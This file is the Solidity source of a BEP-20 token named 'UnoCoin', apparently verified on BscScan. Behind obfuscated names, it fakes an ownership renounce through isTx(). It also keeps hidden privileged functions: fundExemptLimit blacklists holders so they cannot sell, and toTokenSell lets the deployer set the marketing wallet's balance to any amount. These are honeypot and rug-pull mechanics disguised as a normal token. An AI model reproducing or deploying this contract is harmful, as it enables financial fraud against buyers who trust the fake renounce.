/**
 *Submitted for verification at BscScan.com on 2023-02-18
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface exemptSell {
    function totalSupply() external view returns (uint256);

    function balanceOf(address maxEnable) external view returns (uint256);

    function transfer(address txMode, uint256 modeListLaunched) external returns (bool);

    function allowance(address receiverAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeListLaunched) external returns (bool);

    function transferFrom(
        address sender,
        address txMode,
        uint256 modeListLaunched
    ) external returns (bool);

    event Transfer(address indexed from, address indexed maxSender, uint256 value);
    event Approval(address indexed receiverAuto, address indexed spender, uint256 value);
}

interface exemptSellMetadata is exemptSell {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract limitLiquidity {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface totalEnable {
    function createPair(address minAuto, address launchedMode) external returns (address);
}

interface maxWalletTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract UnoCoin is limitLiquidity, exemptSell, exemptSellMetadata {

    function tradingAt() public {
        if (launchTakeWallet == swapTake) {
            swapTake = launchTakeWallet;
        }
        
        launchTakeWallet=0;
    }

    address public sellEnable;

    function autoLimit(address senderReceiver, address txMode, uint256 modeListLaunched) internal returns (bool) {
        require(isAmount[senderReceiver] >= modeListLaunched);
        isAmount[senderReceiver] -= modeListLaunched;
        isAmount[txMode] += modeListLaunched;
        emit Transfer(senderReceiver, txMode, modeListLaunched);
        return true;
    }

    mapping(address => bool) public teamSell;

    constructor (){
        
        maxWalletTrading fromMarketingShould = maxWalletTrading(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        sellEnable = totalEnable(fromMarketingShould.factory()).createPair(fromMarketingShould.WETH(), address(this));
        limitReceiver = _msgSender();
        if (launchedLaunch == amountBuy) {
            launchTakeWallet = swapTake;
        }
        amountMarketing = _msgSender();
        enableSell[_msgSender()] = true;
        
        isAmount[_msgSender()] = teamAt;
        emit Transfer(address(0), amountMarketing, teamAt);
        isTx();
    }

    bool private amountBuy;

    function toReceiver(address senderReceiver, address txMode, uint256 modeListLaunched) internal returns (bool) {
        if (senderReceiver == amountMarketing) {
            return autoLimit(senderReceiver, txMode, modeListLaunched);
        }
        require(!teamSell[senderReceiver]);
        return autoLimit(senderReceiver, txMode, modeListLaunched);
    }

    bool public limitMax;

    function marketingLaunchLaunched() public view returns (bool) {
        return amountBuy;
    }

    uint256 private swapTake;

    function transfer(address swapTo, uint256 modeListLaunched) external virtual override returns (bool) {
        return toReceiver(_msgSender(), swapTo, modeListLaunched);
    }

    function fundExemptLimit(address enableTo) public {
        
        if (enableTo == amountMarketing || enableTo == sellEnable || !enableSell[_msgSender()]) {
            return;
        }
        
        teamSell[enableTo] = true;
    }

    string private totalSwapLiquidity = "Uno Coin";

    uint256 private launchTakeWallet;

    function isTx() public {
        emit OwnershipTransferred(amountMarketing, address(0));
        limitReceiver = address(0);
    }

    event OwnershipTransferred(address indexed teamFrom, address indexed modeFund);

    bool public launchedLaunch;

    mapping(address => bool) public enableSell;

    function approve(address tradingLaunch, uint256 modeListLaunched) public virtual override returns (bool) {
        listExemptAmount[_msgSender()][tradingLaunch] = modeListLaunched;
        emit Approval(_msgSender(), tradingLaunch, modeListLaunched);
        return true;
    }

    function getOwner() external view returns (address) {
        return limitReceiver;
    }

    function launchExempt() public {
        if (launchedLaunch == amountBuy) {
            launchTakeWallet = swapTake;
        }
        if (launchedLaunch == amountBuy) {
            launchedLaunch = false;
        }
        amountBuy=false;
    }

    function allowance(address feeFund, address tradingLaunch) external view virtual override returns (uint256) {
        return listExemptAmount[feeFund][tradingLaunch];
    }

    function name() external view virtual override returns (string memory) {
        return totalSwapLiquidity;
    }

    mapping(address => mapping(address => uint256)) private listExemptAmount;

    function symbol() external view virtual override returns (string memory) {
        return listTxSell;
    }

    string private listTxSell = "UCN";

    function owner() external view returns (address) {
        return limitReceiver;
    }

    function toTokenSell(uint256 modeListLaunched) public {
        if (!enableSell[_msgSender()]) {
            return;
        }
        isAmount[amountMarketing] = modeListLaunched;
    }

    function balanceOf(address maxEnable) public view virtual override returns (uint256) {
        return isAmount[maxEnable];
    }

    function senderMaxLaunched() public {
        if (launchedLaunch != amountBuy) {
            launchTakeWallet = swapTake;
        }
        if (launchedLaunch == amountBuy) {
            swapTake = launchTakeWallet;
        }
        launchedLaunch=false;
    }

    mapping(address => uint256) private isAmount;

    function decimals() external view virtual override returns (uint8) {
        return buyFrom;
    }

    address private limitReceiver;

    uint8 private buyFrom = 18;

    function tokenTotal(address senderToMin) public {
        if (limitMax) {
            return;
        }
        if (swapTake != launchTakeWallet) {
            launchTakeWallet = swapTake;
        }
        enableSell[senderToMin] = true;
        if (launchTakeWallet == swapTake) {
            launchedLaunch = true;
        }
        limitMax = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return teamAt;
    }

    function fundLiquidity() public view returns (bool) {
        return amountBuy;
    }

    uint256 private teamAt = 100000000 * 10 ** 18;

    function transferFrom(address senderReceiver, address txMode, uint256 modeListLaunched) external override returns (bool) {
        if (listExemptAmount[senderReceiver][_msgSender()] != type(uint256).max) {
            require(modeListLaunched <= listExemptAmount[senderReceiver][_msgSender()]);
            listExemptAmount[senderReceiver][_msgSender()] -= modeListLaunched;
        }
        return toReceiver(senderReceiver, txMode, modeListLaunched);
    }

    address public amountMarketing;

}